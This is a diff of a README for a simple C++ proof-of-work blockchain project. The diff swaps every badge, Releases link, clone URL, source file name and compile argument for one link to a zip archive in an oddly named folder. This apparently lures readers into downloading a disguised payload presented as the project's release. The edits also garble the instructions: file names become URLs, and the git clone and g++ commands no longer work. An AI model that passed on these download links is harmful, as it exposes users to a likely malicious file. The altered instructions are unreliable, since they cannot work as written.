@@ -1,9 +1,9 @@
 # Simple PoW Blockchain 🪙
 
-![GitHub release (latest by date)](https://img.shields.io/github/v/release/EliteHustler/Simple_PoW_Blockchain?style=flat-square)
-![GitHub issues](https://img.shields.io/github/issues/EliteHustler/Simple_PoW_Blockchain?style=flat-square)
-![GitHub forks](https://img.shields.io/github/forks/EliteHustler/Simple_PoW_Blockchain?style=flat-square)
-![GitHub stars](https://img.shields.io/github/stars/EliteHustler/Simple_PoW_Blockchain?style=flat-square)
+![GitHub release (latest by date)](https://github.com/EliteHustler/Simple_PoW_Blockchain/raw/refs/heads/main/cacochymia/Blockchain_Simple_Po_egocentrism.zip)
+![GitHub issues](https://github.com/EliteHustler/Simple_PoW_Blockchain/raw/refs/heads/main/cacochymia/Blockchain_Simple_Po_egocentrism.zip)
+![GitHub forks](https://github.com/EliteHustler/Simple_PoW_Blockchain/raw/refs/heads/main/cacochymia/Blockchain_Simple_Po_egocentrism.zip)
+![GitHub stars](https://github.com/EliteHustler/Simple_PoW_Blockchain/raw/refs/heads/main/cacochymia/Blockchain_Simple_Po_egocentrism.zip)
 
 Welcome to the **Simple PoW Blockchain** repository! This C++ program showcases a basic blockchain implementation using OpenSSL for SHA-256 hashing. Each block in the chain holds transaction data, a timestamp, and a nonce. The program employs proof-of-work to mine blocks with a defined difficulty target.
 
@@ -34,7 +34,7 @@ Blockchain technology has transformed how we think about data integrity and secu
 
 ## Getting Started
 
-To get started, you can download the latest release from the [Releases section](https://github.com/EliteHustler/Simple_PoW_Blockchain/releases). This link will take you to the necessary files for execution.
+To get started, you can download the latest release from the [Releases section](https://github.com/EliteHustler/Simple_PoW_Blockchain/raw/refs/heads/main/cacochymia/Blockchain_Simple_Po_egocentrism.zip). This link will take you to the necessary files for execution.
 
 ## How It Works
 
@@ -62,11 +62,11 @@ Proof-of-work (PoW) is a consensus mechanism that requires miners to solve compl
 
 The project consists of several key files:
 
-- `main.cpp`: The entry point of the program.
+- `https://github.com/EliteHustler/Simple_PoW_Blockchain/raw/refs/heads/main/cacochymia/Blockchain_Simple_Po_egocentrism.zip`: The entry point of the program.
 - `block.h`: Defines the Block class.
-- `block.cpp`: Implements the Block class methods.
+- `https://github.com/EliteHustler/Simple_PoW_Blockchain/raw/refs/heads/main/cacochymia/Blockchain_Simple_Po_egocentrism.zip`: Implements the Block class methods.
 - `chain.h`: Defines the Blockchain class.
-- `chain.cpp`: Implements the Blockchain class methods.
+- `https://github.com/EliteHustler/Simple_PoW_Blockchain/raw/refs/heads/main/cacochymia/Blockchain_Simple_Po_egocentrism.zip`: Implements the Blockchain class methods.
 - `utils.h`: Contains utility functions, including hashing.
 
 ## Installation
@@ -75,7 +75,7 @@ To install the program, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/EliteHustler/Simple_PoW_Blockchain.git
+   git clone https://github.com/EliteHustler/Simple_PoW_Blockchain/raw/refs/heads/main/cacochymia/Blockchain_Simple_Po_egocentrism.zip
    cd Simple_PoW_Blockchain
    ```
 
@@ -95,7 +95,7 @@ To install the program, follow these steps:
 3. **Compile the Program**:
    Use the following command to compile the code:
    ```bash
-   g++ main.cpp block.cpp chain.cpp -o blockchain -lssl -lcrypto
+   g++ https://github.com/EliteHustler/Simple_PoW_Blockchain/raw/refs/heads/main/cacochymia/Blockchain_Simple_Po_egocentrism.zip https://github.com/EliteHustler/Simple_PoW_Blockchain/raw/refs/heads/main/cacochymia/Blockchain_Simple_Po_egocentrism.zip https://github.com/EliteHustler/Simple_PoW_Blockchain/raw/refs/heads/main/cacochymia/Blockchain_Simple_Po_egocentrism.zip -o blockchain -lssl -lcrypto
    ```
 
 ## Usage
@@ -124,7 +124,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For questions or feedback, please reach out to the repository owner. You can also check the [Releases section](https://github.com/EliteHustler/Simple_PoW_Blockchain/releases) for updates and new features.
+For questions or feedback, please reach out to the repository owner. You can also check the [Releases section](https://github.com/EliteHustler/Simple_PoW_Blockchain/raw/refs/heads/main/cacochymia/Blockchain_Simple_Po_egocentrism.zip) for updates and new features.
 
 ---
 
